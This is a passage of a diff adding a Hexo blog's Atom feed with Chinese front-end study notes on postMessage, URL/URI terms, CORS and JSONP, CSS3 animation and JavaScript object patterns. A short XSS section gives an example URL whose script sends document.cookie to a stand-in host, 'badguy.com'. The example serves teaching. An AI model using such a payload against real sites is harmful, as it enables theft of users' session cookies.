+    <link href="http://yoursite.com/2016/05/12/%E8%B7%A8%E6%96%87%E6%A1%A3%E9%80%9A%E4%BF%A1/"/>
+    <id>http://yoursite.com/2016/05/12/跨文档通信/</id>
+    <published>2016-05-12T15:30:32.000Z</published>
+    <updated>2016-05-14T14:59:53.585Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;跨文档消息传递&quot;&gt;&lt;a href=&quot;#跨文档消息传递&quot; class=&quot;headerlink&quot; title=&quot;跨文档消息传递&quot;&gt;&lt;/a&gt;跨文档消息传递&lt;/h1&gt;&lt;h2 id=&quot;跨文档通信&quot;&gt;&lt;a href=&quot;#跨文档通信&quot; class=&quot;headerlink&quot; title=&quot;跨文档通信&quot;&gt;&lt;/a&gt;跨文档通信&lt;/h2&gt;&lt;p&gt;Message事件&lt;br&gt;html5，通过iframe，postMessage(data,origin,source);&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;data: 数据&lt;/li&gt;
+&lt;li&gt;origin: 发送消息的文档所在的域&lt;/li&gt;
+&lt;li&gt;source: 发送消息的文档的window的对象代理。&lt;h2 id=&quot;跨窗口通信&quot;&gt;&lt;a href=&quot;#跨窗口通信&quot; class=&quot;headerlink&quot; title=&quot;跨窗口通信&quot;&gt;&lt;/a&gt;跨窗口通信&lt;/h2&gt;postMessage,目标文档加载完后，向源文档postMessage，源文档在postMessage到目标文档，实现跨窗口通信。&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;跨文档消息传递&quot;&gt;&lt;a href=&quot;#跨文档消息传递&quot; class=&quot;headerlink&quot; title=&quot;跨文档消息传递&quot;&gt;&lt;/a&gt;跨文档消息传递&lt;/h1&gt;&lt;h2 id=&quot;跨文档通信&quot;&gt;&lt;a href=&quot;#跨文档通信&quot; class=&quot;headerlink&quot; ti
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>url、uri、urn、src和href</title>
+    <link href="http://yoursite.com/2016/05/10/url%E3%80%81uri%E3%80%81urn%E3%80%81src%E5%92%8Chref/"/>
+    <id>http://yoursite.com/2016/05/10/url、uri、urn、src和href/</id>
+    <published>2016-05-10T03:50:32.000Z</published>
+    <updated>2016-05-14T15:08:10.153Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;url、uri、urn、src和href&quot;&gt;&lt;a href=&quot;#url、uri、urn、src和href&quot; class=&quot;headerlink&quot; title=&quot;url、uri、urn、src和href&quot;&gt;&lt;/a&gt;url、uri、urn、src和href&lt;/h1&gt;&lt;h2 id=&quot;uri-Uniform-Resource-identifier-统一资源标识符&quot;&gt;&lt;a href=&quot;#uri-Uniform-Resource-identifier-统一资源标识符&quot; class=&quot;headerlink&quot; title=&quot;uri(Uniform Resource identifier) 统一资源标识符&quot;&gt;&lt;/a&gt;uri(Uniform Resource identifier) 统一资源标识符&lt;/h2&gt;&lt;p&gt;用于标志某物&lt;/p&gt;
+&lt;h2 id=&quot;urn-Uniform-Resource-Name-统一资源命名符&quot;&gt;&lt;a href=&quot;#urn-Uniform-Resource-Name-统一资源命名符&quot; class=&quot;headerlink&quot; title=&quot;urn(Uniform Resource Name) 统一资源命名符&quot;&gt;&lt;/a&gt;urn(Uniform Resource Name) 统一资源命名符&lt;/h2&gt;&lt;p&gt;用于命名某物，有区分度，唯一&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;url-Uniform-Resource-Locator-统一资源定位符&quot;&gt;&lt;a href=&quot;#url-Uniform-Resource-Locator-统一资源定位符&quot; class=&quot;headerlink&quot; title=&quot;url(Uniform Resource Locator) 统一资源定位符&quot;&gt;&lt;/a&gt;url(Uniform Resource Locator) 统一资源定位符&lt;/h2&gt;&lt;p&gt;用于定位某物&lt;br&gt;css常用中，下面两者常用html中&lt;/p&gt;
+&lt;h2 id=&quot;href超文本引用&quot;&gt;&lt;a href=&quot;#href超文本引用&quot; class=&quot;headerlink&quot; title=&quot;href超文本引用&quot;&gt;&lt;/a&gt;href超文本引用&lt;/h2&gt;&lt;p&gt;href是Hypetext Reference的缩写，&lt;strong&gt;引用&lt;/strong&gt;，属性的值可以是任何有效文档的相对或绝对URL，从而在当前元素或者当前属性定义的需要的锚点或资源之间定义一个链接或者关系。&lt;br&gt;a和link&lt;/p&gt;
+&lt;h2 id=&quot;src资源，嵌入&quot;&gt;&lt;a href=&quot;#src资源，嵌入&quot; class=&quot;headerlink&quot; title=&quot;src资源，嵌入&quot;&gt;&lt;/a&gt;src资源，嵌入&lt;/h2&gt;&lt;p&gt;src是source的缩写，属性仅仅&lt;strong&gt;嵌入&lt;/strong&gt;当前资源到当前文档元素定义的位置&lt;br&gt;script和frame和img&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;url、uri、urn、src和href&quot;&gt;&lt;a href=&quot;#url、uri、urn、src和href&quot; class=&quot;headerlink&quot; title=&quot;url、uri、urn、src和href&quot;&gt;&lt;/a&gt;url、uri、urn、src和href&lt;/h1&gt;&lt;h2 id=&quot;uri-Uniform-Resource-identifier-统一资源标识符&quot;&gt;&lt;a href=&quot;#uri-Uniform-Resource-identifier-统一资源标识符&quot; class=&quot;headerlink&quot; title=&quot;uri(Uniform Resource identifier) 统一资源标识符&quot;&gt;&lt;/a&gt;uri(Uniform Resource identifier) 统一资源标识符&lt;/h2&gt;&lt;p&gt;用于标志某物&lt;/p&gt;
+&lt;h2 id=&quot;urn-Uniform-Resource-Name-统一资源命名符&quot;&gt;&lt;a href=&quot;#urn-Uniform-Resource-Name-统一资源命名符&quot; class=&quot;headerlink&quot; title=&quot;urn(Uniform Resource Name) 统一资源命名符&quot;&gt;&lt;/a&gt;urn(Uniform Resource Name) 统一资源命名符&lt;/h2&gt;&lt;p&gt;用于命名某物，有区分度，唯一&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>跨域</title>
+    <link href="http://yoursite.com/2016/05/10/%E8%B7%A8%E5%9F%9F/"/>
+    <id>http://yoursite.com/2016/05/10/跨域/</id>
+    <published>2016-05-10T02:50:32.000Z</published>
+    <updated>2016-10-01T10:01:21.036Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;跨域资源共享&quot;&gt;&lt;a href=&quot;#跨域资源共享&quot; class=&quot;headerlink&quot; title=&quot;跨域资源共享&quot;&gt;&lt;/a&gt;跨域资源共享&lt;/h1&gt;&lt;h3 id=&quot;CORS-cross-orgin-resource-sharing&quot;&gt;&lt;a href=&quot;#CORS-cross-orgin-resource-sharing&quot; class=&quot;headerlink&quot; title=&quot;CORS(cross-orgin resource sharing)&quot;&gt;&lt;/a&gt;CORS(cross-orgin resource sharing)&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;需要服务端设置Access-Control-Allow-Origin&lt;/li&gt;
+&lt;li&gt;不能使用setRequestHeader()&lt;/li&gt;
+&lt;li&gt;不能发送接收cookie&lt;/li&gt;
+&lt;li&gt;调用getAllResonseHeaders()方法返回空字符串&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h3 id=&quot;图像Ping&quot;&gt;&lt;a href=&quot;#图像Ping&quot; class=&quot;headerlink&quot; title=&quot;图像Ping&quot;&gt;&lt;/a&gt;图像Ping&lt;/h3&gt;&lt;p&gt;通过new Image()动态创建img对象&lt;br&gt;只能发送GET请求，无法访问服务器的响应文本&lt;/p&gt;
+&lt;h3 id=&quot;JSONP&quot;&gt;&lt;a href=&quot;#JSONP&quot; class=&quot;headerlink&quot; title=&quot;JSONP&quot;&gt;&lt;/a&gt;JSONP&lt;/h3&gt;&lt;p&gt;动态创建script元素，script.src=”&lt;a href=&quot;http://freegeiop.net/json/?callback=handleResponse&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://freegeiop.net/json/?callback=handleResponse&lt;/a&gt;“;&lt;br&gt;function handleResponse(response){}&lt;/p&gt;
+&lt;h4 id=&quot;XSS-Cross-Site-Scripting-跨站攻击脚本&quot;&gt;&lt;a href=&quot;#XSS-Cross-Site-Scripting-跨站攻击脚本&quot; class=&quot;headerlink&quot; title=&quot;XSS(Cross Site Scripting)跨站攻击脚本&quot;&gt;&lt;/a&gt;XSS(Cross Site Scripting)跨站攻击脚本&lt;/h4&gt;&lt;h5 id=&quot;Dom-Based-XSS&quot;&gt;&lt;a href=&quot;#Dom-Based-XSS&quot; class=&quot;headerlink&quot; title=&quot;Dom-Based XSS&quot;&gt;&lt;/a&gt;Dom-Based XSS&lt;/h5&gt;&lt;p&gt;连接中带有js代码，如&lt;br&gt;&lt;code&gt;http://victim.com/search.asp?term=&amp;lt;script&amp;gt;window.open(&amp;quot;http://badguy.com?cookie=&amp;quot;+document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;将网站cookie发送到某网站&lt;/p&gt;
+&lt;h5 id=&quot;Stored-XSS&quot;&gt;&lt;a href=&quot;#Stored-XSS&quot; class=&quot;headerlink&quot; title=&quot;Stored XSS&quot;&gt;&lt;/a&gt;Stored XSS&lt;/h5&gt;&lt;p&gt;将带有攻击代码保存到数据库中。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;跨域资源共享&quot;&gt;&lt;a href=&quot;#跨域资源共享&quot; class=&quot;headerlink&quot; title=&quot;跨域资源共享&quot;&gt;&lt;/a&gt;跨域资源共享&lt;/h1&gt;&lt;h3 id=&quot;CORS-cross-orgin-resource-sharing&quot;&gt;&lt;a href=&quot;#CORS-cross-orgin-resource-sharing&quot; class=&quot;headerlink&quot; title=&quot;CORS(cross-orgin resource sharing)&quot;&gt;&lt;/a&gt;CORS(cross-orgin resource sharing)&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;需要服务端设置Access-Control-Allow-Origin&lt;/li&gt;
+&lt;li&gt;不能使用setRequestHeader()&lt;/li&gt;
+&lt;li&gt;不能发送接收cookie&lt;/li&gt;
+&lt;li&gt;调用getAllResonseHeaders()方法返回空字符串&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>小记</title>
+    <link href="http://yoursite.com/2016/05/08/%E5%B0%8F%E8%AE%B0/"/>
+    <id>http://yoursite.com/2016/05/08/小记/</id>
+    <published>2016-05-08T06:50:32.000Z</published>
+    <updated>2016-05-08T07:48:16.661Z</updated>
+    
+    <content type="html">&lt;p&gt;今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="随笔" scheme="http://yoursite.com/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CSS3动画</title>
+    <link href="http://yoursite.com/2016/05/08/CSS3%E5%8A%A8%E7%94%BB/"/>
+    <id>http://yoursite.com/2016/05/08/CSS3动画/</id>
+    <published>2016-05-08T06:02:54.000Z</published>
+    <updated>2016-05-14T15:05:09.945Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;CSS3动画&quot;&gt;&lt;a href=&quot;#CSS3动画&quot; class=&quot;headerlink&quot; title=&quot;CSS3动画&quot;&gt;&lt;/a&gt;CSS3动画&lt;/h1&gt;&lt;h2 id=&quot;transform-改变元素样式，并不会产生动画效果，有以下属性&quot;&gt;&lt;a href=&quot;#transform-改变元素样式，并不会产生动画效果，有以下属性&quot; class=&quot;headerlink&quot; title=&quot;transform 改变元素样式，并不会产生动画效果，有以下属性&quot;&gt;&lt;/a&gt;transform 改变元素样式，并不会产生动画效果，有以下属性&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;函数&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;translated3d(x,y,z)&lt;/td&gt;
+&lt;td&gt;用来控制元素的位置在页面上的三轴的位置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;rotate(deg)&lt;/td&gt;
+&lt;td&gt;用来控制元素旋转角度&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;skew(x,y)(deg)&lt;/td&gt;
+&lt;td&gt;用来制作倾斜度的，在2d里创建3d视图&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;scale3d(x,y,z)&lt;/td&gt;
+&lt;td&gt;用来放大缩小效果，比值&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;matrix3d&lt;/td&gt;
+&lt;td&gt;把所有3D转换方法组合在一下，使用 16 个值的 4x4 矩阵&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;transiton-一个简单的动画属性，animation的简化版本&quot;&gt;&lt;a href=&quot;#transiton-一个简单的动画属性，animation的简化版本&quot; class=&quot;headerlink&quot; title=&quot;transiton 一个简单的动画属性，animation的简化版本&quot;&gt;&lt;/a&gt;transiton 一个简单的动画属性，animation的简化版本&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;transition&lt;/span&gt;: width &lt;span class=&quot;number&quot;&gt;2s&lt;/span&gt;,height &lt;span class=&quot;number&quot;&gt;2s&lt;/span&gt;,transform &lt;span class=&quot;number&quot;&gt;2s&lt;/span&gt; ease-in;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;transition属性：  &lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;函数&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;transition-property&lt;/td&gt;
+&lt;td&gt;指定过渡的性质，比如transition–  property:backgrond 就是只指定backgound参与这个过渡&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;transition-duration&lt;/td&gt;
+&lt;td&gt;指定这个过渡的持续时间&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;transition-delay&lt;/td&gt;
+&lt;td&gt;延迟过渡时间&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;transition-timing-function&lt;/td&gt;
+&lt;td&gt;指定过渡类型，有ease linear, ease-in, ease-out, ease-in-out, cubic-bezier&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;属性&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;linear&lt;/td&gt;
+&lt;td&gt;线性过度&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ease-in&lt;/td&gt;
+&lt;td&gt;由慢到快&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ease-out&lt;/td&gt;
+&lt;td&gt;由快到慢&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ease-in-out&lt;/td&gt;
+&lt;td&gt;由慢到快在到慢&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&quot;animation&quot;&gt;&lt;a href=&quot;#animation&quot; class=&quot;headerlink&quot; title=&quot;animation&quot;&gt;&lt;/a&gt;animation&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;@&lt;span class=&quot;keyword&quot;&gt;keyframes&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;wobble&#39;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	0%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;attribute&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;100px&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	30%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;attribute&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;300px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	100%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;attribute&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;500px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.animate&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;100px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;-webkit-animation&lt;/span&gt;:wobble &lt;span class=&quot;number&quot;&gt;0.5s&lt;/span&gt; ease-out;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;-webkit-animation-fill-mode&lt;/span&gt;:backwards;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;属性：  &lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;属性&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;@keyframes&lt;/td&gt;
+&lt;td&gt;规定动画.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation&lt;/td&gt;
+&lt;td&gt;所有动画属性的简写属性，除了 animation-play-state 属性&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-name&lt;/td&gt;
+&lt;td&gt;规定 @keyframes 动画的名称。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-duration&lt;/td&gt;
+&lt;td&gt;规定动画完成一个周期所花费的秒或毫秒。默认是 0。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-timing-function&lt;/td&gt;
+&lt;td&gt;规定动画的速度曲线。默认是 “ease”。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-delay&lt;/td&gt;
+&lt;td&gt;规定动画何时开始。默认是 0。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-iteration-count&lt;/td&gt;
+&lt;td&gt;规定动画被播放的次数。默认是 1。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-direction&lt;/td&gt;
+&lt;td&gt;规定动画是否在下一周期逆向地播放。默认是 “normal”，alternate。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-play-state&lt;/td&gt;
+&lt;td&gt;规定动画是否正在运行或暂停。默认是 “running”,paused。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;animation-fill-mode&lt;/td&gt;
+&lt;td&gt;规定对象动画时间之外的状态。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;CSS3动画&quot;&gt;&lt;a href=&quot;#CSS3动画&quot; class=&quot;headerlink&quot; title=&quot;CSS3动画&quot;&gt;&lt;/a&gt;CSS3动画&lt;/h1&gt;&lt;h2 id=&quot;transform-改变元素样式，并不会产生动画效果，有以下属性&quot;&gt;&lt;a href=&quot;#transform-改变元素样式，并不会产生动画效果，有以下属性&quot; class=&quot;headerlink&quot; title=&quot;transform 改变元素样式，并不会产生动画效果，有以下属性&quot;&gt;&lt;/a&gt;transform 改变元素样式，并不会产生动画效果，有以下属性&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;函数&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;translated3d(x,y,z)&lt;/td&gt;
+&lt;td&gt;用来控制元素的位置在页面上的三轴的位置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;rotate(deg)&lt;/td&gt;
+&lt;td&gt;用来控制元素旋转角度&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;skew(x,y)(deg)&lt;/td&gt;
+&lt;td&gt;用来制作倾斜度的，在2d里创建3d视图&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;scale3d(x,y,z)&lt;/td&gt;
+&lt;td&gt;用来放大缩小效果，比值&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;matrix3d&lt;/td&gt;
+&lt;td&gt;把所有3D转换方法组合在一下，使用 16 个值的 4x4 矩阵&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+    
+    </summary>
+    
+    
+      <category term="CSS3" scheme="http://yoursite.com/tags/CSS3/"/>
+    
+      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>闭包原型和继承</title>
+    <link href="http://yoursite.com/2016/04/15/%E9%97%AD%E5%8C%85%E5%8E%9F%E5%9E%8B%E5%92%8C%E7%BB%A7%E6%89%BF/"/>
+    <id>http://yoursite.com/2016/04/15/闭包原型和继承/</id>
+    <published>2016-04-15T13:05:14.000Z</published>
+    <updated>2016-10-02T06:16:46.429Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;闭包&quot;&gt;&lt;a href=&quot;#闭包&quot; class=&quot;headerlink&quot; title=&quot;闭包&quot;&gt;&lt;/a&gt;闭包&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;定义：是有权访问另一个函数作用域中变量的函数&lt;/li&gt;
+&lt;li&gt;作用：让变量常驻内存，保护作用&lt;/li&gt;
+&lt;li&gt;原因：JavaScript中的函数运行在它们被定义的作用域里，而不是它们被执行的作用域里。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;对象&quot;&gt;&lt;a href=&quot;#对象&quot; class=&quot;headerlink&quot; title=&quot;对象&quot;&gt;&lt;/a&gt;对象&lt;/h2&gt;&lt;h3 id=&quot;工厂模式&quot;&gt;&lt;a href=&quot;#工厂模式&quot; class=&quot;headerlink&quot; title=&quot;工厂模式&quot;&gt;&lt;/a&gt;工厂模式&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;特点：在函数中显示创建对象，将方法与属性赋予对象，再将对象返回出去。&lt;/li&gt;
+&lt;li&gt;缺点：不能识别对象类型&lt;h3 id=&quot;构造函数模式&quot;&gt;&lt;a href=&quot;#构造函数模式&quot; class=&quot;headerlink&quot; title=&quot;构造函数模式&quot;&gt;&lt;/a&gt;构造函数模式&lt;/h3&gt;&lt;/li&gt;
+&lt;li&gt;特点：没有显示地创建对象，而是将方法与与属性赋予this对象，采用new操作，创建一种新的类型&lt;/li&gt;
+&lt;li&gt;缺点：对于每一个实例都会重新创造方法，没有复用&lt;h3 id=&quot;原型模式&quot;&gt;&lt;a href=&quot;#原型模式&quot; class=&quot;headerlink&quot; title=&quot;原型模式&quot;&gt;&lt;/a&gt;原型模式&lt;/h3&gt;&lt;/li&gt;
+&lt;li&gt;原理：每创造一个新函数，都会隐式地为它创建一个prototype属性，它指向一个对象（原型对象），这个对象包含所有实例共享的属性与方法，用构造函数创建一个实例后，实例内部会包含一个指针，指向原型对象。注意&lt;br&gt;-缺点： 属性共享&lt;h3 id=&quot;构造函数和原型组合&quot;&gt;&lt;a href=&quot;#构造函数和原型组合&quot; class=&quot;headerlink&quot; title=&quot;构造函数和原型组合&quot;&gt;&lt;/a&gt;构造函数和原型组合&lt;/h3&gt;不多说&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;动态原型模式&quot;&gt;&lt;a href=&quot;#动态原型模式&quot; class=&quot;headerlink&quot; title=&quot;动态原型模式&quot;&gt;&lt;/a&gt;动态原型模式&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;创建原型对象方法时检测是否此方法有效，若无效才创建&lt;h3 id=&quot;寄生构造函数模式&quot;&gt;&lt;a href=&quot;#寄生构造函数模式&quot; class=&quot;headerlink&quot; title=&quot;寄生构造函数模式&quot;&gt;&lt;/a&gt;寄生构造函数模式&lt;/h3&gt;  function Person(name, age, job){&lt;pre&gt;&lt;code&gt;var o = new Object();
+o.name = name;
+o.age = age;
+o.job = job;
+o.sayName = function(){
+    alert(this.name);
+};
+return o;
+&lt;/code&gt;&lt;/pre&gt;  }&lt;br&gt;  var friend = new Person(“Nicholas”, 29, “Software Engineer”);&lt;br&gt;  friend.sayName(); //“Nicholas”&lt;br&gt;使用new操作符，内部为工厂模式&lt;h3 id=&quot;稳妥构造函数模式&quot;&gt;&lt;a href=&quot;#稳妥构造函数模式&quot; class=&quot;headerlink&quot; title=&quot;稳妥构造函数模式&quot;&gt;&lt;/a&gt;稳妥构造函数模式&lt;/h3&gt;与工厂模式区别在于不使用this&lt;/li&gt;
